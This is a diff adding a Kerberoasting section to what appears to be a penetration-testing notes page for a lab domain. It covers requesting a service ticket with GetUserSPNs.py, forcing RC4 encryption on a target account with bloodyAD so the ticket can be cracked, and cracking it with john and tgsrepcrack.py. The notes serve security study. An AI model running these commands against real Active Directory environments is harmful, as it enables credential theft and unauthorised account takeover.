@@ -87,3 +87,24 @@ john --format=krb5tgs crackfile --wordlist=10k-worst-pass.txt
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-svc@HTTP~WEB.vulnableone.local-VULNABLEONE.LOCAL.kirbi
 ```
 {% endcode %}
+
+### Kerberos Service Ticket
+
+{% code overflow="wrap" %}
+```bash
+GetUserSPNs.py -dc-ip 10.129.15.xx -request-user mark.davies 'checkpoint.htb/alex.turner:Checkpoint2024!'
+```
+{% endcode %}
+
+The $krb5tgs$18$ hash uses AES encryption, which is too strong to crack efficiently. We need to set SupportedEncryptionTypes to 4 (RC4) and request a new TGS ticket
+
+<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+##We Force RC4 Encryption for the Target User (Write ACL Needed)
+bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
+    -u 'alex.turner' -p 'Checkpoint2024!' \
+    set object mark.davies msDS-SupportedEncryptionTypes -v 4
+```
+{% endcode %}
